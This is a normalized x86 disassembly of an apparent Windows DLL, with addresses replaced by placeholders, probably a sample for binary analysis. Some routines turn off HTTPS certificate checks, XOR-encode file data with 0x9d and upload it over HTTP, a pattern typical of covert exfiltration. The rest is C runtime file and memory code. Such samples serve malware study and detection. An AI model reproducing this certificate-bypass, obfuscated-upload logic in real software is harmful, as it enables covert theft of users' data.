push r--data
push edi
push ebx
push eax
jmp r-xdata
mov edi [ InternetSetOptionA@IAT ]
cmp [ esi + 0x1421c ] ebp
je r-xdata
mov eax [ esi + 0x14214 ]
cmp eax ebp
je r-xdata
call [ HttpOpenRequestA@IAT ]
mov [ esi + 0x14218 ] eax
cmp eax ebp
jne r-xdata
mov edx [ esi + 0x14218 ]
push 0x4
lea ecx [ esp + 0x10 ]
push ecx
push 0x41
push edx
mov [ esp + 0x1c ] ebp
call edi
pop edi
mov eax 0x1
pop ebp
add esp 0x8
retn
lea edx [ esp + 0x8 ]
push edx
push rw-data
push 0x1f
push eax
mov [ esp + 0x18 ] 0x4
call [ InternetQueryOptionA@IAT ]
or [ rw-data ] 0x3180
mov eax [ esi + 0x14218 ]
push 0x4
push rw-data
push 0x1f
push eax
call edi
mov eax [ esi + 0x14210 ]
cmp eax ebp
je r-xdata
push eax
call [ InternetCloseHandle@IAT ]
mov [ esi + 0x14214 ] ebp
pop edi
xor eax eax
pop ebp
add esp 0x8
retn
push eax
call [ InternetCloseHandle@IAT ]
mov [ esi + 0x14210 ] ebp
sub_1000bd50
sub esp 0x404
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x400 ] eax
push 0x3ff
lea eax [ esp + 0x5 ]
push 0x0
push eax
mov [ esp + 0xc ] 0x0
call sub_1000fe10
push ebx
push edi
lea ecx [ esp + 0x14 ]
push r--data
push ecx
call sub_1000d12a
mov eax [ esi + 0x14218 ]
add esp 0x1c
push 0xa0000000
push 0xffffffff
lea edx [ esp + 0x8 ]
push edx
push eax
call [ HttpAddRequestHeadersA@IAT ]
mov ecx [ esp + 0x400 ]
xor ecx esp
call sub_1000c0a5
add esp 0x404
retn
sub_1000bdc0
mov eax 0x2838
call sub_10017e00
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2830 ] eax
push ebp
push esi
push edi
lea eax [ ebx + 0x14008 ]
push r--data
push eax
call sub_1000c1e0
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
xor eax eax
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x2830 ]
xor ecx esp
call sub_1000c0a5
add esp 0x2838
retn
push 0x2
push 0x0
push ebp
call sub_1000c96a
push ebp
call sub_1000c872
sub eax [ ebx + 0x14208 ]
mov edx [ ebx + 0x14218 ]
xor ecx ecx
add esp 0x10
push ecx
push 0x8
push ecx
mov [ esp + 0x38 ] ecx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] ecx
mov [ esp + 0x2c ] ecx
mov [ esp + 0x30 ] ecx
mov [ esp + 0x34 ] ecx
mov [ esp + 0x3c ] ecx
mov [ esp + 0x40 ] ecx
lea ecx [ esp + 0x1c ]
push ecx
push edx
mov [ esp + 0x24 ] 0x28
mov [ esp + 0x40 ] eax
call [ HttpSendRequestExA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14208 ]
push 0x0
push eax
push ebp
call sub_1000c96a
push 0x27ff
lea ecx [ esp + 0x49 ]
push 0x0
push ecx
mov [ esp + 0x50 ] 0x0
call sub_1000fe10
push ebp
mov [ esp + 0x28 ] 0x0
call sub_1000c0b4
add esp 0x1c
test eax eax
jne r-xdata
push ebp
call sub_1000ca66
add esp 0x4
call [ GetLastError@IAT ]
mov [ ebx ] eax
mov edx [ ebx + 0x14218 ]
push 0x0
push 0x0
push 0x0
push edx
call [ HttpEndRequestA@IAT ]
test eax eax
je r-xdata
push ebp
push 0x2800
lea edx [ esp + 0x40 ]
push 0x1
push edx
call sub_1000c497
push ebp
mov esi eax
call sub_1000c0e8
add esp 0x14
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] eax
push ebp
call sub_1000ca66
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x2830 ]
xor ecx esp
call sub_1000c0a5
add esp 0x2838
retn
push ebp
call sub_1000ca66
mov ecx [ esp + 0x2840 ]
add esp 0x4
pop edi
pop esi
pop ebp
xor ecx esp
xor eax eax
call sub_1000c0a5
add esp 0x2838
retn
test esi esi
jle r-xdata
lea edi [ esp + 0x38 ]
test esi esi
jbe r-xdata
xor [ esp + eax + 0x38 ] 0x9d
inc eax
cmp eax esi
jl r-xdata
push ebp
call sub_1000c0b4
add esp 0x4
test eax eax
je r-xdata
lea ebx [ ebx ]
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
add edi eax
sub esi eax
jne r-xdata
mov ecx [ ebx + 0x14218 ]
lea eax [ esp + 0xc ]
push eax
push esi
push edi
push ecx
call [ InternetWriteFile@IAT ]
test eax eax
je r-xdata
sub_1000bfa0
push ecx
mov eax [ eax + 0x14218 ]
mov [ esp ] 0x0
test eax eax
je r-xdata
xor eax eax
pop ecx
retn 0x4
lea ecx [ esp ]
push ecx
mov ecx [ esp + 0xc ]
push edx
push ecx
push 0x1d
push eax
call [ HttpQueryInfoA@IAT ]
cmp eax 0x1
jne r-xdata
call [ GetLastError@IAT ]
pop ecx
retn 0x4
sub_1000bfe0
sub esp 0x8
mov eax [ eax + 0x14218 ]
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x4
test eax eax
jne r-xdata
lea ecx [ esp ]
push ecx
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
push edx
push ecx
push 0x20000005
push eax
call [ HttpQueryInfoA@IAT ]
dec eax
neg eax
sbb eax eax
inc eax
add esp 0x8
retn 0x4
add esp 0x8
retn 0x4
sub_1000c030
push ecx
mov eax [ ebx + 0x14218 ]
xor ecx ecx
push ebp
mov ebp [ esp + 0xc ]
mov [ esp + 0x4 ] ecx
mov [ esp + 0xc ] ecx
cmp eax ecx
je r-xdata
xor eax eax
pop ebp
pop ecx
retn 0x4
cmp ebp ecx
je r-xdata
push esi
mov esi [ HttpQueryInfoA@IAT ]
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x14 ]
push edx
push ecx
push 0x2b
push eax
call esi
mov eax [ esp + 0x10 ]
cmp eax [ edi ]
ja r-xdata
pop esi
xor eax eax
pop ebp
pop ecx
retn 0x4
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov edx [ ebx + 0x14218 ]
lea ecx [ esp + 0x8 ]
push ecx
push edi
push ebp
push 0x2b
push edx
call esi
neg eax
sbb eax eax
pop esi
neg eax
pop ebp
pop ecx
retn 0x4
sub_1000c0b4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x10
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_1000c0e8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x20
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_1000c11c
push 0xc
push r--data
call sub_1000ed24
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_1000ecdb
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000d8e6
add esp 0x14
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_1000ed69
retn
call sub_1000f38a
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_1000ecdb
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_1000f0c1
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c1d6
mov eax [ ebp - 0x1c ]
call sub_1000ecdb
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_1000f4c4
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_1000c1f7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x18 ]
cmp esi edi
je r-xdata
call sub_1000ecdb
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
jbe r-xdata
cmp esi edi
je r-xdata
push ebx
push edi
push ecx
call sub_1000fe10
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_1000f617
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
jl r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_1000ecdb
mov [ eax ] 0x22
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_1000fe10
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_1000c4bf
pop ecx
push eax
call sub_1000fd04
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
xor esi esi
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_1000db5a
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_1000d8e6
add esp 0x14
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
call sub_1000ecdb
push esi
push esi
push esi
push esi
mov [ eax ] 0x22
push esi
jmp r-xdata
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_1000fe10
add esp 0xc
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_1000c401
push 0xc
push r--data
call sub_1000ed24
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_1000efe3
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c1f7
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c48d
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_1000ed69
retn
call sub_1000ecdb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_1000d8e6
add esp 0x14
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_1000fe10
add esp 0xc
sub_1000c4bf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_1000c4f1
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0xc ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] edi
je r-xdata
mov esi [ ebp + 0x14 ]
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
call sub_1000ecdb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
xor edx edx
div [ ebp + 0xc ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_1000fe8a
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_100107ff
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_1000c4bf
pop ecx
push eax
call sub_10010723
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_100109a0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_1000c653
push 0xc
push r--data
call sub_1000ed24
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_1000efe3
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c4f1
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c6cb
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_1000ecdb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_1000d8e6
add esp 0x14
call sub_1000ed69
retn
sub_1000c6d5
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_1000c4bf
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
push 0x1
push ebx
push eax
call sub_1000e91b
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_1000ecdb
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_1000e91b
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_1000e91b
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_1000c872
push 0xc
push r--data
call sub_1000ed24
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_1000efe3
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_1000c6d5
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c8d6
mov eax [ ebp - 0x1c ]
call sub_1000ecdb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_1000ed69
retn
sub_1000c8e0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_1000ecdb
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_100107ff
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_1000c6d5
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1000c4bf
pop ecx
push eax
call sub_1000e91b
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_1000c96a
push 0xc
push r--data
call sub_1000ed24
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_1000ecdb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1000efe3
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c8e0
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c9e5
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_1000ed69
retn
cmp edi 0x2
jne r-xdata
sub_1000c9ef
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_1000ecdb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_100107ff
push esi
mov ebx eax
call sub_10010e6e
push esi
call sub_1000c4bf
push eax
call sub_10010da1
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_1000ced5
pop ecx
mov [ esi + 0x1c ] edi
sub_1000ca66
push 0xc
push r--data
call sub_1000ed24
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_1000ecdb
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_1000efe3
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_1000c9ef
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000cada
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_1000ed69
retn
mov eax [ ebp - 0x1c ]
sub_1000cafd
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1000cfb2
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_10010fec
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
push esi
lea ecx [ ebp - 0xc ]
call sub_1000a2e0
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_10011014
int3
or [ rw-data ] 0x1
mov ecx esi
call sub_1000cae2
push sub_1001e656
call sub_10010fc6
pop ecx
sub_1000cb70
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1000cbf8 ]
jmp [ ecx * 4 + jump_table_1000cc78 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000cce4 ]
pop esi
pop edi
pop ebp
jmp sub_10011d25
jmp [ ecx * 4 + jump_table_1000ce80 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1000cd84 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000ce80 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000cce4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
